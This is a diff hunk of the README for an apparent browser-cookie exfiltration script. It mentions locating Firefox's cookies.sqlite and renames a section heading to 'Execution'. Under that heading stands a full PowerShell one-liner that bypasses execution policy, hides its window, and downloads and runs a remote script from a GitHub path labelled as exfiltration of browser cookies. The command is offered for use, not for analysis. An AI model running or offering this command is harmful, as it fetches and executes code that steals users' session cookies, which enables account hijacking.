@@ -25,7 +25,7 @@ Open a PowerShell, select dynamically the Firefox path adding "cookies.sqlite" a
 * Opera must be installed
 
 
-All
+Execution
 ```powershell
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Exfilaration/ExportCookiesBrowsers/exportCookies.ps1').Content"
 ```
